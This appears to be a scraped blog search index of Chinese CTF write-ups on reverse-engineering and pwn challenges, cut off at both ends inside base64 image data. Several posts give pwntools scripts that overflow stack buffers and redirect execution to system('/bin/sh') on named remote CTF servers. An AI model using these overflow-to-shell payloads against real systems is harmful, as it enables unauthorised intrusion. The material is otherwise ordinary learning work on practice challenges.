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 原来这是图片数据，base64 png让我想到了经常看见但是没用过的base64转图片，转出来一个二维码，扫描后得到flag。 Timer用dex2jar和jd-gui操作一下得到 12345if (MainActivity.this.beg - MainActivity.this.now &lt;= 0) &#123; paramBundle.setText(&quot;The flag is:&quot;); localTextView.setText(&quot;alictf&#123;&quot; + MainActivity.this.stringFromJNI2(MainActivity.this.k) + &quot;&#125;&quot;); &#125; 可以看到flag的格式啥的了，可是不会java有点看不懂，后面也有几题都是apk，等看了java再来看看。 love直接ida打开，搜索flag找到了关键函数。 要求输入flag，经过一个函数加密后，再每一位加上下标值，与一固定字符串对比。写脚本得出加上下标值之前的字符串： 123456#!/usr/bin/env pythonkey=&apos;e3nifIH9b_C@n@dH&apos;temp=&apos;&apos;for i in range(len(key)): temp+=chr(ord(key[i])-i)print temp 后发现加密函数就是base64加密，直接解密刚刚得到的temp字符串得到flag。","categories":[],"tags":[]},{"title":"cgctf-stackoverflow","slug":"cgctf-stackoverflow","date":"2018-10-03T11:34:16.000Z","updated":"2018-10-03T12:18:16.289Z","comments":true,"path":"2018/10/03/cgctf-stackoverflow/","link":"","permalink":"http://yoursite.com/2018/10/03/cgctf-stackoverflow/","excerpt":"","text":"题目地址 拖进ida，有system函数无/bin/sh字符串，主函数里如果choice!=1就不会进入message函数，所以第一个输入就sendline(‘1’)就行了 message函数： 12345678char s; // [esp+18h] [ebp-30h]n = 10;puts(&quot;you can leave some message here:&quot;);fgets(A, 60, stdin);puts(&quot;your name please:&quot;);fgets(&amp;s, n, stdin);return puts(&quot;Thank you&quot;); a可以用来存放/bin/sh字符串，n的地址就在a后面，而a的大小只有40，所以输入超过40的话就可以改变n的值，让s(大小为0x30)产生栈溢出，最终覆盖掉message函数的返回地址，进入system函数。 脚本如下： 1234567891011from pwn import *sh=remote(&apos;182.254.217.142&apos;,10001)sh.recvuntil(&apos;your choice:&apos;)sh.sendline(&apos;1&apos;)sh.recvuntil(&apos;you can leave some message here:&apos;)payload=&apos;/bin/sh\\0&apos;+&apos;a&apos;*40sh.sendline(payload)sh.recvuntil(&apos;your name please:&apos;)payload=&apos;a&apos;*0x30+&apos;a&apos;*4+p32(0x80483f0)+&apos;a&apos;*4+p32(0x0804a080)sh.sendline(payload)sh.interactive() 随后按照题目提示进入目录cat flag即可","categories":[],"tags":[]},{"title":"十一欢乐赛-pwn4","slug":"十一欢乐赛-pwn4","date":"2018-10-03T09:19:05.000Z","updated":"2018-10-03T09:54:31.371Z","comments":true,"path":"2018/10/03/十一欢乐赛-pwn4/","link":"","permalink":"http://yoursite.com/2018/10/03/十一欢乐赛-pwn4/","excerpt":"","text":"有system函数 无/bin/sh字符串 首先要求输入账号密码，查找字符串，账号为admin，密码为T6OBSh2i,之后进入menu函数，choice的输入有栈溢出，可以被利用，选择1之后可以对cmd字符串修改，给system提供参数/bin/sh。 因此大致就是首先输入账号密码，然后选择1，修改完system参数后返回menu函数，然后利用输入把menu的返回值覆盖为system函数的地址，最后选择3，退出menu函数，进入system函数，执行/bin/sh。 脚本如下： 12345678910111213141516from pwn import *sh=remote(&quot;47.100.40.190&quot;,10009)sh.recvuntil(&apos;username: &apos;)sh.sendline(&apos;admin&apos;)sh.recvuntil(&apos;password: &apos;)sh.sendline(&apos;T6OBSh2i&apos;)sh.recvuntil(&apos;Your choice: &apos;)sh.sendline(&apos;1&apos;)sh.recvuntil(&apos;Command: &apos;)sh.sendline(&apos;/bin/sh&apos;)sh.recvuntil(&apos;Your choice: &apos;)payload=&apos;a&apos;*0x50+&apos;a&apos;*8+p64(0x40084a)sh.sendline(payload)sh.recvuntil(&apos;Your choice: &apos;)sh.sendline(&apos;3&apos;)sh.interactive() 随后cat flag即可得到flag","categories":[],"tags":[]},{"title":"十一欢乐赛-bss_stack","slug":"十一欢乐赛-bss-stack","date":"2018-10-03T08:24:15.000Z","updated":"2018-10-03T09:27:54.207Z","comments":true,"path":"2018/10/03/十一欢乐赛-bss-stack/","link":"","permalink":"http://yoursite.com/2018/10/03/十一欢乐赛-bss-stack/","excerpt":"","text":"找了半天才找到在哪有栈溢出QAQ 是在输入完用户名再输入1之后， 12345678char s; // [esp+11h] [ebp-17h]printf(&quot;Enter password: &quot;);fflush(stdout);fgets(&amp;s, 100, stdin);puts(&quot;Authentification failed&quot;);fflush(stdout);return sleep(1u); fgets可以读入100个字符，s大小为0x17,所以输入超过0x17+4的话就可以覆盖返回地址。 这题是有system函数调用的，只是没有/bin/sh字符串，所以只需要找到system地址，再在username地址写入/bin/sh就行了，另外call system的时候会push一个返回地址，再往后才是参数command，因此要留出4个字节的offset脚本如下： 12345678910from pwn import *sh=remote(&quot;47.100.40.190&quot;,10011)sh.recvuntil(&apos;User name : &apos;)sh.sendline(&apos;/bin/sh&apos;)sh.recvuntil(&apos;Action: &apos;)sh.sendline(&apos;1&apos;)sh.recvuntil(&apos;Enter password: &apos;)payload=&apos;a&apos;*0x17+&apos;a&apos;*4+p32(0x08048500)+&apos;a&apos;*4+p32(0x08049dc8)sh.sendline(payload)sh.interactive() 之后cat flag就可以得到flag了","categories":[],"tags":[]},{"title":"cgctf-born","slug":"cgctf-born","date":"2018-10-02T08:37:30.000Z","updated":"2018-10-02T15:38:05.591Z","comments":true,"path":"2018/10/02/cgctf-born/","link":"","permalink":"http://yoursite.com/2018/10/02/cgctf-born/","excerpt":"","text":"题目地址 看了欢乐赛里面的pwn题稍微了解了一些，但是再深入还是不会做，就想到先来cgctf把最简单的做了2333 打开test.c: 12345678910111213141516171819202122232425262728293031#include &lt;stdio.h&gt;struct Student &#123; char name[8]; int birth;&#125;;int main(void) &#123; setbuf(stdin, 0); setbuf(stdout, 0); setbuf(stderr, 0); struct Student student; printf(&quot;What\\&apos;s Your Birth?\\n&quot;); scanf(&quot;%d&quot;, &amp;student.birth); while (getchar() != &apos;\\n&apos;) ; if (student.birth == 1926) &#123; printf(&quot;You Cannot Born In 1926!\\n&quot;); return 0; &#125; printf(&quot;What\\&apos;s Your Name?\\n&quot;); gets(student.name); printf(&quot;You Are Born In %d\\n&quot;, student.birth); if (student.birth == 1926) &#123; printf(&quot;You Shall Have Flag.\\n&quot;); system(&quot;cat flag&quot;); &#125; else &#123; printf(&quot;You Are Naive.\\n&quot;); printf(&quot;You Speed One Second Here.\\n&quot;); &#125; return 0;&#125; 发现生日输入不能为1926（-1s），但是必须要birth=1926时才能cat flag，于是看到输入name时的gets函数是没有限制的，但是name是一个8字符大小的数组，所以可以通过输入超过8位的字符来覆盖掉birth使其等于1926，代码如下： 12345from pwn import *sh = remote(&apos;ctf.acdxvfsvd.net&apos;,1926)sh.sendline(&apos;0&apos;)sh.sendline(&apos;0&apos;*8 + p32(1926))sh.interactive flag get","categories":[],"tags":[]},{"title":"十一欢乐赛-reverse","slug":"十一欢乐赛-reverse","date":"2018-10-02T05:03:23.000Z","updated":"2018-10-03T08:24:38.780Z","comments":true,"path":"2018/10/02/十一欢乐赛-reverse/","link":"","permalink":"http://yoursite.com/2018/10/02/十一欢乐赛-reverse/","excerpt":"","text":"HelloReverse直接拖进ida，发现一个名为getflag的函数，点进去发现plain里存着flag。 HelloPythonpyc文件反编译一波直接运行，得不到flag分析一波程序。 123if len(sys.argv) &lt; 5: print(&quot;I can&apos;t give you flag :(&quot;) sys.exit(0) 找到了一个判断条件，直接把exit(0)去掉 再把输入flag的判断条件改为1： 12if int(sys.argv[1]) &gt; 10 and Fibonacci(int(sys.argv[1])) == int(sys.argv[4]): print(decrypt(15, &apos;MFKFMFMELFJEEHIFMDDGMGAGCGKGAFLHAGAFPHGHLHHGAGBGICMHAFIHAGNHODLGCH&apos;)) 运行发现n = None // 2会报错改成n=1试试发现输出了一个S应该就是flag的开头 最后尝试出n=33时输出完整flag XOR1ida打开发现直接把两个数组异或就能得到flag XOR2和1差不多，区别是有一个数组是rand函数生成的，不过rand函数生成的随机数其实也是固定的。一开始用mac试了很久得不到flag，后来想起来不同系统随机数生成的也不一样，又用windows尝试，结果最后发现要用linux。 Maze写过了maze就很容易了，wasd对应上下左右移动地图如下： 123456789OOOO*OOOOO1111O11OO1OOOO1OOO11O111OOOO111OO1OOOO1OO11OOOO111O1OOOO1O1111OOOOOOOO1 沿着1走到*得到flag 加上SUSCTF{} 题目都很简单，其他方向的也都是当场百度就能做(pwn还没","categories":[],"tags":[]},{"title":"cgctf-homuraVM","slug":"cgctf-homuraVM","date":"2018-09-29T10:23:34.000Z","updated":"2018-09-29T12:30:24.435Z","comments":true,"path":"2018/09/29/cgctf-homuraVM/","link":"","permalink":"http://yoursite.com/2018/09/29/cgctf-homuraVM/","excerpt":"","text":"题目地址 ida打开F5主函数代码,要求输入一个字符串s 然后input[i+1]=s[i]input[0]=s[len(s)-1] 之后把两个很长的字符串分别赋值到v39,v40 sub_8DC函数根据这两个字符串对input进行操作 sub_8AA不知道是干啥的，后百度得知是反调试 最后将处理过的input与给定的值对比，相同则ok value1和value2初始值为0 i为很长的字符串的下标 读取到每个字符对应到的操作如下： 12345678910111213141516171819case &quot;C&quot;:*value2-=2*(*value1&amp;*ipnut) ++icase &quot;G&quot;:--*value2 ++icase &quot;M&quot;:*value2=*value1+*input ++icase &quot;T&quot;:++*value2 ++icase &quot;[&quot;:if *input!=0 ++i else i为]后一位case &quot;]&quot;:if *input!=0 i为[后一位 else ++icase &quot;a&quot;:--*value1 ++icase &quot;h&quot;:input=input+4 ++icase &quot;m&quot;:++*input ++icase &quot;o&quot;:input=input-4 ++icase &quot;r&quot;:++*value1 ++icase &quot;u&quot;:--*input ++icase &quot;v&quot;:*value2=*value1 ++icase &quot;&#123;&quot;:if *value2!=0 ++i else i为&#125;后一位case &quot;&#125;&quot;:if *value2!=0 i为&#123;后一位 else ++i 注意到h是对input进行下标+1的操作，所以以h为分界线把很长的字符串分割开如下 12345678910111213141516171819202122232425262728293031323334h[ur]ovMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovaaaMCh&#123;mG&#125; hv&#123;aG&#125;[ur]ovrrMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovrararaMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovrararrrMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovararaaMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovrararraraMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovrrrarrrMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovaarrarrMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovaaarrarMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovrrrarrMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovaarrraaMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovarraarMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovrrraaarrMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovaaarrrrarrMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovrrrraarrarrMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovrrarraMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovaaraarMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovrrarraMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovaarrrarMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovrraarraMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovrrarMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovaarrarMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovrrraarMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovrrrraaMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovrrarraMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovrrrrrrMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovaaaarMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovrraaaMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovaarraMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovrrarMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovaarraaMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovaarraraMCh&#123;mG&#125;hv&#123;aG&#125;[ur]ovaarrararMCh&#123;mG&#125; 其中，每条都有的部分为hv{aG}[ur]ov……MCh{mG} 1234567891011121314151617181920[ur]： *value1=*input *input减到0 &#123;aG&#125;： *value1-=*value2 *value2减到0 &#123;mG&#125;： *input+=*value2 *value2减到0 hv&#123;aG&#125;[ur]ov……MCh&#123;mG&#125;:input+=4*value2=*value1*value1-=*value2*value2=0*value1=*input*input=0input-=4*value2=*value1.. 此部分仅ar数量及顺序不同，控制*value1.*value2=*value1+*input*value2-=2*(*value1&amp;*ipnut)input+=4*input+=*value2*value2=0 作用为：input[i+1]=(input[i]+ar处理过的input[i+1])-2*(ar处理过的input[i+1]&amp;input[i]) 不知道怎么逆运算，只能尝试爆破了，打算先求出被ar处理过的input[i+1] 12345678import stringfinal=[27,114,17,118,8,74,126,5,55,124,31,88,104,7,112,7,49,108,4,47,4,105,54,77,127,8,80,12,109,28,127,80,29,96,]ar=&apos;&apos;for i in range(33): for s in string.printable: if ord(s)+final[i]-2*(ord(s)&amp;final[i])==final[i+1]: ar+=sprint ar 得到ar处理后的flag从第二位开始为icg~B4{2KcG0oww6]h++m_{2wX\\aqc/M} 接下来根据ar的个数进行逆运算即可: 123456operate=[+3,-2,0,-3,+2,-1,-5,-1,+1,-4,+1,0,-2,-2,-5,-2,+2,-2,-1,-1,-2,0,-2,-2,-2,-6,+3,+1,+1,-2,+2,+1,0]final=list(&apos;icg~B4&#123;2KcG0oww6]h++m_&#123;2wX\\\\aqc/M&#125;&apos;)for i in range(len(operate)): final[i]=chr(operate[i]+ord(final[i]))flag=&apos;&apos;.join(final)print flag 得到flag第二位开始为lag{D3v1L_H0mur4_f**k_y0uR_bra1N} 很明显第一位为f 手动添加上 flag get","categories":[],"tags":[]},{"title":"sus-ccc","slug":"sus-ccc","date":"2018-09-26T14:52:35.000Z","updated":"2018-10-11T12:51:43.294Z","comments":true,"path":"2018/09/26/sus-ccc/","link":"","permalink":"http://yoursite.com/2018/09/26/sus-ccc/","excerpt":"","text":"题目地址 主函数很简单，直接看验证函数： 1234567891011v6 = 0;if ( a2 != 42 ) return 0;for ( i = 3; i &lt;= 42; i += 3 )&#123; v3 = crc32(0, (_BYTE *)a1, i); v4 = v6++; if ( v3 != hashes[v4] ) return 0;&#125;return 1; 输入一共42位，1-3，1-6，1-9一直到1-42循环经过crc32函数处理后与hashes值进行比对，一共比对14次。crc32函数如下： 123456789v6 = a2; for ( i = ~a1; ; i = (i &gt;&gt; 8) ^ crc32_tab[(unsigned __int8)(i ^ *v3)] ) &#123; v4 = a3--; if ( !v4 ) break; v3 = v6++; &#125; return ~i; 然而不管是写爆破脚本还是逆运算脚本都没能得到flag……觉得自己对函数的理解没有错误，百度了一下python中~0=-1,c语言中~0=1，所以出了问题。看了大佬的writeup发现python里可以使用crc32函数，于是爆破脚本如下： 1234567891011121314#!/usr/bin/env pythonimport stringimport binasciihashes=[0xD641596F,0x80A3E990,0xC98D5C9B,0xD05AFAF,0x1372A12D,0x5D5F117B,0x4001FBFD,0xA7D2D56B,0x7D04FB7E,0x2E42895E,0x61C97EB3,0x84AB43C3,0x9FC129DD,0xF4592F4D]flag=&apos;&apos;for n in hashes: for i in string.printable: for j in string.printable: for k in string.printable: temp=i+j+k if binascii.crc32(flag+temp)&amp;0xffffffff == n: flag+=temp break;print flag flag get","categories":[],"tags":[]},{"title":"sus-accumulator","slug":"sus-accumulator","date":"2018-09-24T07:15:10.000Z","updated":"2018-09-24T07:32:29.961Z","comments":true,"path":"2018/09/24/sus-accumulator/","link":"","permalink":"http://yoursite.com/2018/09/24/sus-accumulator/","excerpt":"","text":"题目地址 拖进ida 主函数： 12345678910111213141516171819202122232425262728293031323334__int64 v3; // rbx char v4; // al signed __int64 result; // rax __int64 v6; // [rsp+0h] [rbp-458h] char v7; // [rsp+3Fh] [rbp-419h] char input; // [rsp+40h] [rbp-418h] unsigned __int64 v9; // [rsp+448h] [rbp-10h] v3 = 0LL; v9 = __readfsqword(0x28u); __printf_chk(1LL, &quot;What&apos;s your flag? &quot;, a3); do &#123; v4 = _IO_getc(stdin); if ( v4 == &apos;\\n&apos; ) break; if ( v4 == -1 ) break; *(&amp;v7 + ++v3) = v4; &#125; while ( v3 != 1024 ); if ( SHA512((__int64)&amp;input, v3, (__int64)&amp;v6) )// v6=sha512(input) &#123; sub_4008C0((unsigned __int8 *)&amp;v6, 64LL); sub_4008C0((unsigned __int8 *)&amp;input, v3); puts(&quot;Good flag for you.&quot;); result = 0LL; &#125; else &#123; puts(&quot;error&quot;); result = 1LL; &#125; return result; do~while循环里是读取输入，最多读取1024位，遇到回车符或读取完则停止，很明显if条件必成立，v6=sha512(input)，进入sub4008c0函数 123456789101112131415161718192021222324252627if ( a2 ) &#123; v2 = i + *a1; // i,j初始为0 v3 = v2 == dword_601080[j]; v4 = (unsigned int)(j + 1); i += *a1; ++j; if ( !v3 ) &#123;LABEL_8: puts(&quot;Bad flag :(&quot;); exit(1); &#125; v5 = a1 + 1; v6 = &amp;a1[a2]; while ( v5 != v6 ) &#123; v7 = *v5++; v2 += v7; v3 = v2 == dword_601080[v4]; i = v2; j = v4 + 1; if ( !v3 ) goto LABEL_8; v4 = (unsigned int)(v4 + 1); &#125; &#125; 一开始没分析出i和j的作用…对应的地址内存值为????一脸懵逼以为是没看见赋值，后知道了i和j是下标的作用，很容易分析出dword601080处的值就是input累加的结果，也就是说flag和dword601080内存值的位数是相等的，直接根据第二次sub4008c0就可以逆运算出flag，不需要管if条件对v6的操作以及第一次此函数对v6值的校验。然而照这样手动逆运算了前几个值，并没有得到类似于flag开头之类的字符，以为是分析错了，又看了好几遍函数，结果只是flag并不是从头开始……前几位是无意义的字符而已， 首次使用了idc脚本dump下了dword601080处内存，逆运算脚本如下： 123456a=[195,255,493,584,799,929,946,1086,1180,1184,1421,1595,1805,1846,2081,2320,2430,2605,2727,2972,3213,3403,3418,3649,3712,3950,3989,4193,4228,4394,4523,4624,4706,4935,4999,5072,5106,5291,5510,5536,5644,5751,5993,6118,6126,6198,6211,6410,6469,6609,6647,6752,6978,7010,7053,7106,7274,7468,7563,7673,7706,7956,8146,8187,8257,8333,8398,8469,8592,8640,8693,8742,8793,8844,8901,8953,9007,9062,9113,9161,9215,9317,9374,9429,9483,9540,9591,9644,9692,9741,9792,9846,9944,9996,10045,10144,10195,10246,10294,10350,10402,10450,10551,10652,10750,10849,10946,11045,11096,11147,11202,11304,11353,11451,11507,11605,11653,11753,11852,11900,11951,12052,12105,12161,12259,12360,12409,12461,12563,12664,12718,12775,12823,12921,12970,13020,13071,13173,13227,13276,13374,13422,13521,13569,13667,13718,13771,13873,13972,14029,14080,14179,14278,14377,14432,14482,14531,14579,14627,14679,14732,14789,14840,14894,14951,15052,15154,15210,15263,15314,15363,15460,15509,15610,15666,15763,15818,15916,15968,16018,16075,16132,16233,16288,16386,16443,16543,16600,16655,16703,16801,16858,16955,17005,17056,17153,17250,17375]b=[195]for i in range(1,len(a)): b.append(a[i]-a[i-1])s=&apos;&apos;.join([chr(i)for i in b])print s 忽略掉前几个无意义字符后出现flag{} 12sH1rkEr:desktop macbook$ python 1.py?;?&amp;i? +5??_n!??)FLAG&#123;051339467306f9769350136b41c330840eebcac337f1b8b0dc03e58be14fe690b123f61b0c0b35fc93ccc72100459369ef8531a1e8a7b4299e7b9d970b9a23aa&#125; flag get","categories":[],"tags":[]},{"title":"sus-pyyy","slug":"sus-pyyy","date":"2018-09-24T04:22:05.000Z","updated":"2018-09-24T04:28:57.306Z","comments":true,"path":"2018/09/24/sus-pyyy/","link":"","permalink":"http://yoursite.com/2018/09/24/sus-pyyy/","excerpt":"","text":"题目地址 下载下来是个pyc文件，直接反编译一波： 12345678910111213141516171819202122232425#!/usr/bin/env python__import__(&apos;sys&apos;).setrecursionlimit(1048576)data = &apos;Tt1PJbKTTP+nCqHvVwojv9K8AmPWx1q1UCC7yAxMRIpddAlH+oIHgTET7KHS1SIZshfo2DOu8dUt6wORBvNVBpUSsuHa0S78KG+SCQtB2lr4c1RPbMf0nR9SeSm1ptEY37y310SJMY28u6m4Y44qniGTi39ToHRTyxwsbHVuEjf480eeYAfSVvpWvS8Oy2bjvy0QMVEMSkyJ9p1QlGgyg3mUnNCpSb96VgCaUe4aFu4YbOnOV3HUgYcgXs7IcCELyUeUci7mN8HSvNc93sST6mKl5SDryngxuURkmqLB3azioL6MLWZTg69j6dflQIhr8RvOLNwRURYRKa1g7CKkmhN4RytXn4nyK2UM/SoR+ntja1scBJTUo0I31x1wBJpT4HjDN47FLQWIkRW+2wnB3eEwO5+uSiQpzA8VaH7VGRrlU/BFW4GqbaepzKPLdXQFBkNyBKzqzR/zA2GIrYbLIVScWJ19DqJCOyVLGeVIVXyzN1y327orYL2Ee3lRITnE3FouicRStaznIcw8xmxvukwVMRZIJ/vTu8Zc1WQIYEIFXMHozGuvzZgROZTyFihWNRCBBtoP9DJJALJb0pA1IKIb2zLh+pwGF40Y6y93D6weKejGPO+A0DBXH9vuLcCcCIvr/XPQhO3jLKCBN+h9unuJKW3dyWxyaVPdR2V+BTw10VXolo7yaTH1GbR4TiVSB308mBOMwfchwihEe7RdMXvmXgaGarKkJe0NLUCd8jwhYII+WymjxO/xOz/ppOvNfAyIQksW0sggRPQTlgXSZ7MIVA1h66sGNljJ833MoFzWof3azLabaz1OrAJFqYXBg/myDsy1tV6rULSQ82hVR/TNnSmBGvyEDJTrLSwHyj78NOrW4mUnlLGBnAgWfw6pW2lRK2jkNX9NM6DfLsRK8lwl85UP8CZSuNdcLmLwHTVMZGm/cNkZCtWRBlZqEggxGdIO44D+f4y6ysnAk5/QzEwjIuecxEOb0jyV6dFui8g0c3Oxlhzcli0X8ToJFyeQRv1N9nokYZ07tFlG6m18kCToKz1qiH1U7kljXa6SvdORur5dWYLQ//gwhwppe7JlNda/cEoh92h